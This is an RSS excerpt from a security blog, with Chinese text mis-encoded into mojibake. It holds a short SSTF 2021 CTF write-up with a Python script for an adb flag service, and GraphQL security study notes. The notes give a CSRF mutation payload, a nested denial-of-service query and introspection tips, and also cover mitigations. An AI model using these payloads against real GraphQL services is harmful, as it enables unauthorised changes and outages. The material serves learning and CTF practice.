&lt;p>æ˜¯åœ¨&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">çœ‹wp&lt;/a>çš„æ—¶å€™æ³¨æ„åˆ°çš„é¢˜ï¼Œçœ‹äº†ä¸ªå¤§æ¦‚æµç¨‹ï¼ˆå…¶å®åªæ˜¯çœ¼ç†Ÿadbè€Œå·² èœé¸¡ åˆ«éª‚äº†ï¼‰ï¼Œæ‰€ä»¥ä¸‹é¢å°±æ˜¯å¤§æ¦‚ç¿»è¯‘ä¸€ä¸‹wpï¼Œå¾ˆæ°´&lt;/p>
&lt;p>å…ˆè¿æ¥ä¸Š&lt;code>adb connect adbaby.sstf.site:6666&lt;/code>ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªé­”æ”¹è¿‡çš„adbï¼Œå±è”½äº†shellå’Œä¸»è¦åŠŸèƒ½ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨push/pullï¼Œå±äºæ–‡ä»¶ç®¡ç†ç±»çš„å‘½ä»¤ï¼ˆå…¨éƒ¨æŒ‡ä»¤å‚è§-&amp;gt;&lt;a href="https://www.jianshu.com/p/839c04b7e1e3">ä½ ç¡®å®šå·²ç»æŒæ¡äº†adbçš„ä½¿ç”¨ï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;code>adb pull /proc/self/exe adbaby&lt;/code>æ‹¿åˆ°æ–‡ä»¶ç”¨IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°flagçš„è·¯å¾„åœ¨/data/local/tmp/flagå¤„ï¼Œä½†ç›´æ¥ç”¨adb pullæ˜¯ä¸å¯è¾¾çš„ï¼Œå› ä¸ºå¯¹&lt;code>./&lt;/code>, &lt;code>../&lt;/code>, &lt;code>data&lt;/code>, &lt;code>local&lt;/code>, &lt;code>tmp&lt;/code>, &lt;code>flag&lt;/code>è¿™äº›å­—çœ¼è¿›è¡Œäº†è¿‡æ»¤&lt;/p>
&lt;p>æœ‰ä¸€ä¸ªè‡ªå®šçš„serviceåä¸ºadb Flag Serviceï¼Œå¯¹è¾“å…¥çš„å¯†ç è¿›è¡Œæ£€æŸ¥ï¼Œmd5åå¼€å¤´æ˜¯0123456çš„è¯å°±å¯ä»¥æ‹¿åˆ°flagï¼Œç”¨è„šæœ¬è·‘ä¸€ä¸‹ 415349420009&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">adb&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>
&lt;span style="color:#111">device&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AdbCommands&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectDevice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">serial&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;adbaby.sstf.site:6666&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">InteractiveShellCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;415349420009&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Do_Uth1nk_th1s_1s_adb}&lt;/code>&lt;/p></description></item><item><title>GraphQLå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphqlç®€è¿°">GraphQLç®€è¿°&lt;/h2>
&lt;p>GraphQLæ˜¯ä¸€ç§é’ˆå¯¹Graphï¼ˆå›¾çŠ¶æ•°æ®ï¼‰æŸ¥è¯¢å¾ˆæœ‰ä¼˜åŠ¿çš„Query Languageï¼ˆæŸ¥è¯¢è¯­è¨€ï¼‰ï¼Œè€Œæ¶‰åŠåˆ°å­˜å‚¨æ—¶å¯ä»¥é€‰æ‹©NoSQL, SQLæˆ–å…¶å®ƒä»»æ„å­˜å‚¨æ–¹å¼ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ã€å­˜å†…å­˜é‡Œç­‰ï¼‰ï¼›è¿™æ˜¯ä¸€é—¨ä¾¿äºå‰åç«¯äº¤äº’çš„è¯­è¨€ï¼Œè€Œä¸æ˜¯ä¾¿äºåç«¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­è¨€ã€‚&lt;/p>
&lt;p>åº”ç”¨GraphQLçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å‰ææ˜¯åç«¯æ•°æ®å·²ç»ä»¥å›¾çš„ç»“æ„è¿›è¡Œä¿å­˜ï¼Œï¼ˆå¹¶ä¸”ä¸€å®šæƒ…å†µä¸‹å·²ç»è®¾ç½®å¥½åŸºäºéšç§çš„è®¿é—®æ§åˆ¶ æˆæƒä¸é‰´æƒï¼Œå¦åˆ™ä¼šç›´æ¥è¢«æ”»å‡»è€…æ‰§è¡Œé«˜å±æ“ä½œï¼‰ã€‚æ¯æ¬¡æŸ¥è¯¢æˆ–æ›´æ–°éƒ½æœ‰è‡ªå·±çš„æ ¹èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®æ˜¯æ ‘çŠ¶ç»“æ„ï¼›å¦‚æœå¸Œæœ›ä»¥å›¾çš„å½¢å¼å±•ç¤ºåˆ™å‰ç«¯ä¸èƒ½ç®€å•çš„å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œé‚£å¿…é¡»ä½¿ç”¨ç›¸åº”çš„å­˜å‚¨æ•°æ®åº“ï¼Œé€šè¿‡é¡¶ç‚¹çš„IDæŠŠä¸åŒèŠ‚ç‚¹ä¹‹é—´çš„æŸäº›è¾¹é‡æ–°è¿æ¥èµ·æ¥ã€‚&lt;/p>
&lt;p>å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿ç§»åˆ°GraphQLï¼Œå¦‚æœRESTful APIå·²ç»èƒ½æ»¡è¶³éœ€æ±‚çš„è¯ã€‚&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="å˜æ›´---mutations">å˜æ›´ - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="å†…çœ---introspection">å†…çœ - introspection&lt;/h3>
&lt;p>GraphQL å…è®¸åœ¨æŸ¥è¯¢çš„ä»»ä½•ä½ç½®è¯·æ±‚ &lt;code>__typename&lt;/code>ï¼Œä¸€ä¸ªå…ƒå­—æ®µ(Meta fields)ï¼Œä»¥è·å¾—é‚£ä¸ªä½ç½®çš„å¯¹è±¡ç±»å‹åç§°ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ &lt;code>__schema&lt;/code> å­—æ®µæ¥å‘ GraphQL è¯¢é—®å“ªäº›ç±»å‹æ˜¯å¯ç”¨çš„ï¼Œç±»å‹æœ‰ä»¥ä¸‹è¿™äº›ï¼š&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - è¿™äº›æ˜¯æˆ‘ä»¬åœ¨ç±»å‹ç³»ç»Ÿä¸­å®šä¹‰çš„ç±»å‹ã€‚&lt;/li>
&lt;li>String, Boolean - è¿™äº›æ˜¯å†…å»ºçš„æ ‡é‡ï¼Œç”±ç±»å‹ç³»ç»Ÿæä¾›ã€‚&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - è¿™äº›æœ‰ç€ä¸¤ä¸ªä¸‹åˆ’çº¿çš„ç±»å‹æ˜¯å†…çœç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²è¶Šæƒ">æ•æ„Ÿä¿¡æ¯æ³„éœ²&amp;amp;è¶Šæƒ&lt;/h2>
&lt;p>è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ/è§£æ - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>ç”±äºå¯¹å¯¹è±¡æˆ–å±æ€§çš„æƒé™æ§åˆ¶ä¸å®Œå–„ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ¡ˆä¾‹ï¼š&lt;a href="https://hackerone.com/reports/310946">hackerone ä¸€ç³»åˆ—ä¿¡æ¯æ³„éœ²æ¼æ´&lt;/a>&lt;/p>
&lt;p>åœ¨objects.typesä¸­å¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚email, password, secretkey, token, licensekey, sessionç­‰ï¼Œå¤šå¤šå…³æ³¨åºŸå¼ƒå­—æ®µï¼ˆdeprecated fields)ã€‚å½“å­—æ®µè¢«åºŸå¼ƒåç›´æ¥ç”¨&lt;code>__type&lt;/code>åšå†…çœç¡®å®æŸ¥æ‰¾ä¸åˆ°ï¼Œä½†å½“æŒ‡å®š&lt;code>includeDreprecated: true&lt;/code>æ—¶ï¼Œ&lt;code>__type&lt;/code>ä»ç„¶å¯ä»¥å°†åºŸå¼ƒå­—æ®µæš´éœ²å‡ºæ¥ã€‚&lt;/p>
&lt;h2 id="graphqlçš„è®¤è¯æ–¹å¼">GraphQLçš„è®¤è¯æ–¹å¼&lt;/h2>
&lt;p>GraphQLå¹¶æ²¡æœ‰è§„å®šä»»ä½•èº«ä»½è®¤è¯å’Œæƒé™æ§åˆ¶çš„ç›¸å…³å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´çµæ´»çš„åœ¨åº”ç”¨ä¸­å®ç°å„ç§ç²’åº¦çš„è®¤è¯å’Œæƒé™ï¼›ä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºä¸€äº›â€œè£¸å¥”â€çš„æ¥å£æˆ–æ— æ•ˆè®¤è¯æ— æ•ˆçš„æ¥å£ã€‚&lt;/p>
&lt;h3 id="ç‹¬ç«‹è®¤è¯ç»ˆç«¯-restful">ç‹¬ç«‹è®¤è¯ç»ˆç«¯ (RESTful)&lt;/h3>
&lt;p>é€šç”¨ä¸”å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œå¦‚æœåç«¯æœ¬èº«æ”¯æŒRESTfulæˆ–æœ‰ä¸“é—¨çš„è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥ä¿®æ”¹å°‘é‡ä»£ç å®ç°GraphQLæ¥å£çš„è®¤è¯ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæ·»åŠ jwtè®¤è¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="åœ¨graphqlå†…è®¤è¯">åœ¨GraphQLå†…è®¤è¯&lt;/h3>
&lt;p>å¦‚æœGraphQLçš„åç«¯æ”¯æŒGraphQLä¸èƒ½æ”¯æŒRESTfulï¼Œæˆ–å…¨éƒ¨è¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨GraphQLï¼Œä¹Ÿå¯ä»¥ç”¨æ„é€ ç›¸å…³çš„Query Schemaæ¥å£è¿”å›tokençš„å½¢å¼ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæ„é€ loginçš„Query Schemaï¼Œåœ¨è¿”å›å€¼ä¸­æºå¸¦token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>åœ¨resolverä¸­æä¾›ç™»å½•é€»è¾‘&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from 'bcrptjs';
import jsonwebtoken from 'jsonwebtoken';
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection('User').findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: 'Login success',
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, 'your secret'),
};
}
}
&lt;/code>&lt;/pre>&lt;p>ç™»å½•æˆåŠŸå æˆ‘ä»¬æŠŠtokenè®¾ç½®åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç»§ç»­è¯·æ±‚GraphQLçš„å…¶ä»–æ¥å£ï¼Œè¿™æ—¶éœ€è¦å¯¹ApolloServerè¿›è¡Œå¦‚ä¸‹é…ç½®&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>å®ç°getUserå‡½æ•°&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(' ');
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>é…ç½®å¥½ApolloServeråï¼Œåœ¨resolverä¸­æ ¡éªŒuser&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server';
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError('You must be logged in to see blogs');
}
const {blogId} = args;
const cursor = {}ï¼›
if(blogId){
cursor['_id'] = blogId;
}
const blogs = await db
.collection('blogs')
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="æ›´å¤šå®‰å…¨æ¼æ´">æ›´å¤šå®‰å…¨æ¼æ´&lt;/h2>
&lt;p>Express-GraphQLï¼š&lt;/p>
&lt;ul>
&lt;li>æ¡†æ¶é»˜è®¤æ— é˜²æŠ¤&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Djangoï¼š&lt;/p>
&lt;ul>
&lt;li>ä¾èµ–Djangoçš„å®‰å…¨é…ç½®ï¼ˆSecure As Defaultï¼‰&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>æ— å…³æ¡†æ¶&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrfæ¼æ´">Express-GraphQL Endpoint CSRFæ¼æ´&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;quot;query&amp;quot;:&amp;quot;mutation {\n editProfile(name:\&amp;quot;hacker\&amp;quot;, age: 5) {\n name\n age\n }\n}&amp;quot;,&amp;quot;variables&amp;quot;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>å°†Content-Typeä¿®æ”¹ä¸ºapplication/x-www-form-urlencodeï¼Œä»å¯æˆåŠŸæ‰§è¡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>ç›´æ¥é…åˆburpè‡ªå¸¦çš„Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-æ¼æ´">GraphiQL Clickjacking æ¼æ´&lt;/h3>
&lt;p>å‚è§ï¼šhttps://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>å¯ä»¥é…åˆburpè‡ªå¸¦çš„Clickbanditè¿›è¡Œæ”»å‡»&lt;/p>
&lt;h3 id="graphql-injection-æ¼æ´">GraphQL injection æ¼æ´&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™æ˜¯ä¸€ä¸ªç›¸å½“å…¨çš„payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">è¿™æ˜¯ä¸€ä¸ªè‡ªçœpayload&lt;/a>&lt;/p>
&lt;p>pç¥ppté‡Œçš„ç¤ºæ„å›¾ç›´æ¥æ¬è¿‡æ¥äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>ä»ç„¶æ˜¯æ‹¼æ¥äº†æ¶æ„çš„GraphQLè¯­å¥å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ§åˆ¶ä¸ä¸¥æ ¼ï¼›åŒç±»çš„æ¼æ´è¿˜æœ‰xss, rceç­‰ç­‰&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">æœ‰è¯­æ³•å°±æœ‰è§£æï¼Œæœ‰è§£æå°±ä¼šæœ‰ç»“æ„å’Œé¡ºåºï¼Œæœ‰ç»“æ„å’Œé¡ºåºå°±ä¼šæœ‰æ³¨å…¥ã€‚&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç”¨â€œå‚æ•°åŒ–æŸ¥è¯¢â€çš„æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜æ—¶ï¼Œè¦ç¡®ä¿åç«¯çš„è§£æå¼•æ“æ²¡æœ‰å¤§ç—…&lt;/p>
&lt;h3 id="é€šè¿‡custom-scalarçš„æ³¨å…¥-json">é€šè¿‡Custom Scalarçš„æ³¨å…¥ (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>â€”â€”â€”â€”æ›´å¤šçš„GraphQLiç›¸å…³é—®é¢˜å¯å‚è§&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™ä¸ªgitä»“åº“&lt;/a>ï¼Œä¸€æœ¬æ»¡è¶³ï¼ˆ&lt;/p>
&lt;h3 id="æ‹’ç»æœåŠ¡">æ‹’ç»æœåŠ¡&lt;/h3>
&lt;p>GraphQLä¸­çš„queryå’Œmutationçš„è¿”å›ç»“æœéƒ½æ˜¯å¯ä»¥æœ‰åµŒå¥—çš„å¯¹è±¡çš„ï¼Œå¦‚æœä¸å¯¹åµŒå¥—æ·±åº¦è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½è¢«åˆ©ç”¨ä»è€Œè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚&lt;/p>
&lt;p>ä¸€ä¸ªä¸¾ä¾‹ï¼š&lt;/p>
&lt;p>å®šä¹‰äº†Blogå’ŒAuthor:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>éƒ½æœ‰å„è‡ªçš„Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢ï¼Œæ— é™å¥—å¨ƒå¯¼è‡´dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦åœ¨GraphQLæœåŠ¡å™¨ä¸Šé™åˆ¶æŸ¥è¯¢æ·±åº¦ï¼ŒåŒæ—¶è®¾è®¡GraphQLæ¥å£æ—¶å°½é‡é¿å…å‡ºç°æ­¤ç±»é—®é¢˜ï¼Œä»¥Node.jsä¸ºä¾‹ï¼Œgraphql-depth-limitå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from 'graphql-depth-limit';
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
console.log('user', user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debugæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜">Graphene-Django DEBUGæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="åœ¨ctfä¸­çš„è¡¨ç°">åœ¨CTFä¸­çš„è¡¨ç°&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="ç»“å°¾">ç»“å°¾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; ä¸€ä¸ªæ¼æ´å¤ç°çš„é¶åœºï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°å’Œæ²¡æåˆ°çš„GraphQLå­˜åœ¨çš„æ´&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>å·²ç»æœ‰&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">å†™å¥½çš„wp&lt;/a>äº† ä¸å‘äº’è”ç½‘äº§å‡ºæ¹¿åƒåœ¾ ä»æˆ‘åšèµ·&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">ä¸­æ–‡å®˜ç½‘&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">åœ¨çº¿GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">ä»€ä¹ˆæ˜¯ GraphQLï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">ç©è½¬graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL ä»å…¥é—¨åˆ°å®è·µ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">ã€CuteJavaScriptã€‘GraphQLçœŸé¦™å…¥é—¨æ•™ç¨‹&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">æ”»å‡»GraphQL&lt;/a>&lt;/p>
